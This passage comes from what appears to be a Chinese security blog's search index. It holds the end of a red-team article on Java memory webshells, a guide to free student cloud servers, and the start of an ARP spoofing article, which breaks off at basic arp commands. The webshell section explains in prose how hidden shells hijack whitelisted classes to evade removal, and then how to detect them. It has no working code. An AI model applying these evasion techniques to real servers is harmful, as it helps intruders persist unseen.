的属性值，并动态的添加一个Controller，之后映射到内存地址，获取请求参数实现恶意代码，并做命令回显。</p><h2 id="3、Spring隐形马"><a href="#3、Spring隐形马" class="headerlink" title="3、Spring隐形马"></a>3、Spring隐形马</h2><p>隐形马又叫劫持马，原理跟dll 劫持差不多，都是通过对一个白名单的类进行劫持，从而执行恶意代码。</p><p>在以上内存马中，是通过在内存马中注册一个新的类来实现的，依然是有办法遍历内存中的类来实现查杀。但是隐形马是通过劫持了白名单的类，这样将大大增加查杀的难度。</p><h1 id="五、Agent-类型"><a href="#五、Agent-类型" class="headerlink" title="五、Agent 类型"></a>五、Agent 类型</h1><h2 id="1、Agent-技术示例"><a href="#1、Agent-技术示例" class="headerlink" title="1、Agent 技术示例"></a>1、Agent 技术示例</h2><p>简单而言，Agent 技术允许我们去读取、修改内存中的数据，多用于调试修改等，比如：</p><ul><li>某种编辑器的调试功能，典型如IDA、OD、JetBrains编程开发系列等</li><li>某些软件破解工具，就是修改了内存中的数据</li><li>RASP技术：火线动态IAST（植入运行程序当中，可以深入内存马中检测）</li></ul><h2 id="2、Agent-内存马"><a href="#2、Agent-内存马" class="headerlink" title="2、Agent 内存马"></a>2、Agent 内存马</h2><p>其原理就是深入服务器计算机内存，把一个正常的正在运行的类修改成恶意类</p><h1 id="六、内存马的查杀"><a href="#六、内存马的查杀" class="headerlink" title="六、内存马的查杀"></a>六、内存马的查杀</h1><h2 id="1、内存马的检测"><a href="#1、内存马的检测" class="headerlink" title="1、内存马的检测"></a>1、内存马的检测</h2><p>在java 中，只有在JVM中被加载后的类才能调用执行，因此，内存马的检测需要去内存中排查。</p><p>Java提供了Instrumentation 类来实现运行中注入代码执行，可以通过这个类遍历内存中的class字节码，并反编译成java 代码，进行webshell 检测。</p><h2 id="2、内存马的排查"><a href="#2、内存马的排查" class="headerlink" title="2、内存马的排查"></a>2、内存马的排查</h2><p>虽然内存马运行在内存中，需要特定的手段去查杀，但是其访问的方式跟普通木马无异，都是需要通过URL传递命令执行。可以根据日志中用户的请求路径和参数、已经响应状态码和相应内容进行筛选，以判断是否被注入内存马。</p>]]></content>
      
      
      <categories>
          
          <category> 红队入侵 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java内存马 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【其他经验】阿里云服务器免费领取</title>
      <link href="/2024/04/20/Extracurricular-experience-aliyun/"/>
      <url>/2024/04/20/Extracurricular-experience-aliyun/</url>
      
        <content type="html"><![CDATA[<h1 id="一、阿里云云服务器领取"><a href="#一、阿里云云服务器领取" class="headerlink" title="一、阿里云云服务器领取"></a>一、阿里云云服务器领取</h1><h2 id="一、阿里云7月免费云服务器领取（目前失效）"><a href="#一、阿里云7月免费云服务器领取（目前失效）" class="headerlink" title="一、阿里云7月免费云服务器领取（目前失效）"></a>一、阿里云7月免费云服务器领取（目前失效）</h2><h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h3><p>只要是在校大学生（不分年龄专业）都有一台免费的7个月限期的阿里云服务器。那么如果你是多个人的话，岂不是有永久免费的服务器了？</p><h3 id="二、领取地址"><a href="#二、领取地址" class="headerlink" title="二、领取地址"></a>二、领取地址</h3><p>领取地址：<a href="https://developer.aliyun.com/plan/student">https://developer.aliyun.com/plan/student</a></p><p><img src="/img/Extracurricular-experience-aliyun/image-20240420211657642.png" alt="image-20240420211657642"></p><p>在②的前三个即可领取服务器，后两个即可以续航6个月。</p><h3 id="三、领取一个月的机器"><a href="#三、领取一个月的机器" class="headerlink" title="三、领取一个月的机器"></a>三、领取一个月的机器</h3><p><img src="/img/Extracurricular-experience-aliyun/image-20240420211931740.png" alt="image-20240420211931740"></p><p>需要注册【阿里云】账户，然后在【支付宝】中完成学生认证，就可以领取了，阿里云的账号密码一定要记住</p><p>领取机器时的注意事项：</p><ol><li>我们只能选择机器操作系统的类型（如Debian、Centos、Windows Server等）。那么个人建议选择linux操作系统，如果linux一点都不懂，也不计划在未来接触的话，选择windows server机器。操作系统的版本信息建议选择最新版即可。</li><li>对于其他的一概不能选择（如机器的磁盘大小、带宽大小等，一般都是2CPU 2bit的）</li><li>这里的支付都是0元，不需要扫码支付，点击支付即可成，支付成功之后会出现【管理台】，点击进入管理台</li><li><strong>注意：</strong>个人建议【管理台】的URL地址请保存收藏起来，以免找不到</li><li>这样，就领取成功了</li></ol><h3 id="四、续航六个月"><a href="#四、续航六个月" class="headerlink" title="四、续航六个月"></a>四、续航六个月</h3><p><img src="/img/Extracurricular-experience-aliyun/image-20240420212549691.png" alt="image-20240420212549691"></p><p>需要进行【实验和认证】，这个实验就是练习对云服务器的操作和使用，这里我就不一步步细说了，到时候跟着指示多实操几遍，一遍没搞懂多搞几遍，毕竟以后会一直用。</p><p>稍微说一下：</p><ol><li>印象中有两个项目，都有一个小考核，考核内容和实验内容基本一模一样</li><li>考核过去之后会有电子证书，也是一份荣誉，可以下载收藏起来，要当场下载收藏，别找不到了</li><li>考核过后就可以回来领取续航了</li><li>之后根据续航的提示，给服务器续航六个月。这里，一定要续航六个月，其他时间的话好像是需要付费的。</li><li>之后就搞完了，也可以用xshell 去链接云服务器，会方便很多</li></ol><h2 id="二、高校学生免费3月服务器领取（免费额度300元）"><a href="#二、高校学生免费3月服务器领取（免费额度300元）" class="headerlink" title="二、高校学生免费3月服务器领取（免费额度300元）"></a>二、高校学生免费3月服务器领取（免费额度300元）</h2><p>领取地址：<a href="https://edu.aliyun.com/campus?spm=5176.28623341.J_jkwocrVeAsFNBaE5pOhOZ.1.61d14519RxxQAc">https://edu.aliyun.com/campus?spm=5176.28623341.J_jkwocrVeAsFNBaE5pOhOZ.1.61d14519RxxQAc</a></p><p>在这个页面下方有学习权益，存在云服务器ECS免费使用三个月，配300元免费额度。需要学生实名认证。</p><p>简而言之，是一个限时限量限身份的云服务器</p><h2 id="三、可免费续的一年服务器"><a href="#三、可免费续的一年服务器" class="headerlink" title="三、可免费续的一年服务器"></a>三、可免费续的一年服务器</h2><p>限制：高校师生</p><p>领取地址：<a href="https://university.aliyun.com/mobile?clubTaskBiz=subTask..11755128..10219..&userCode=xbmjzhs4">https://university.aliyun.com/mobile?clubTaskBiz=subTask..11755128..10219..&amp;userCode=xbmjzhs4</a></p><p>通过高校学生通用权益的学生认证可领取300元无门槛的抵扣金券</p><p>购买1年的香港云服务器，费用是288：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://common-buy.aliyun.com/?spm=5176.161059.J_5253785160.2.5498a505WXONLI&amp;commodityCode=swas&amp;request=%257B%2522ord_time%2522%253A%252212%253AMonth%2522%252C%2522order_num%2522%253A1%252C%2522instance_type%2522%253A%2522server%2522%252C%2522app_image%2522%253A%25229caeef89ed3d4c518fbebdb470640280%2522%252C%2522datadisk_type%2522%253A%2522essddatadisk%2522%252C%2522version_type%2522%253A%2522swas.s2.c2m1s40b3t04%2522%252C%2522image_type%2522%253A%2522appimage%2522%257D&amp;regionId=cn-hongkong</span><br></pre></td></tr></table></figure><p>到期续费事项：上面300元无门槛的抵扣金券是每年可以重复领取的，到期之后再去领取即可</p><h1 id="二、华为云-免费-36元1年-服务器领取"><a href="#二、华为云-免费-36元1年-服务器领取" class="headerlink" title="二、华为云 免费&#x2F;36元1年 服务器领取"></a>二、华为云 免费&#x2F;36元1年 服务器领取</h1><h2 id="一、前言-1"><a href="#一、前言-1" class="headerlink" title="一、前言"></a>一、前言</h2><p>华为云有多处免费领取服务器的方法，这里一一分享。而且不管是 免费还是 36元&#x2F;1年 都是挺划算的，而且是2核2G，规格都很不错。</p><h2 id="二、每日限时体验免费服务器"><a href="#二、每日限时体验免费服务器" class="headerlink" title="二、每日限时体验免费服务器"></a>二、每日限时体验免费服务器</h2><p>这是一个活动，截至时间不清楚</p><ul><li><p><strong>活动时间</strong></p><p>带有“每日限量”标签产品 9:30 开放领取，其他产品每天0点开放领取，云产品体验名额有限，领完即止。</p></li><li><p><strong>参与对象</strong></p><p>有一定的要求，大致看了一下，新人用户完全符合</p></li></ul><p>领取地址：<a href="https://activity.huaweicloud.com/free_test/index.html?utm_source=special&utm_medium=organic&utm_adplace=ecs-free-ty-xsms_guanggao2">https://activity.huaweicloud.com/free_test/index.html?utm_source=special&amp;utm_medium=organic&amp;utm_adplace=ecs-free-ty-xsms_guanggao2</a></p><h2 id="三、36元-1年-服务器购买"><a href="#三、36元-1年-服务器购买" class="headerlink" title="三、36元&#x2F;1年 服务器购买"></a>三、36元&#x2F;1年 服务器购买</h2><p>购买地址依然是这里：<a href="https://activity.huaweicloud.com/free_test/index.html?utm_source=special&utm_medium=organic&utm_adplace=ecs-free-ty-xsms_guanggao2">https://activity.huaweicloud.com/free_test/index.html?utm_source=special&amp;utm_medium=organic&amp;utm_adplace=ecs-free-ty-xsms_guanggao2</a></p><p>属于 2核2G，也是非常不错的，可以先提前免费体验一个月</p>]]></content>
      
      
      <categories>
          
          <category> 其他经验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 阿里云 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【红队入侵】ARP欺骗攻击与防御</title>
      <link href="/2024/04/18/Red-Team-Invasion-ARP/"/>
      <url>/2024/04/18/Red-Team-Invasion-ARP/</url>
      
        <content type="html"><![CDATA[<h1 id="【红队入侵】ARP欺骗攻击与防御"><a href="#【红队入侵】ARP欺骗攻击与防御" class="headerlink" title="【红队入侵】ARP欺骗攻击与防御"></a>【红队入侵】ARP欺骗攻击与防御</h1><h2 id="一、ARP原理"><a href="#一、ARP原理" class="headerlink" title="一、ARP原理"></a>一、ARP原理</h2><h3 id="1、ARP一些操作："><a href="#1、ARP一些操作：" class="headerlink" title="1、ARP一些操作："></a>1、ARP一些操作：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">arp查看：arp -a命令</span><br><span class="line">arp删除：arp -d <span class="number">139.35</span>.<span class="number">255.255</span></sp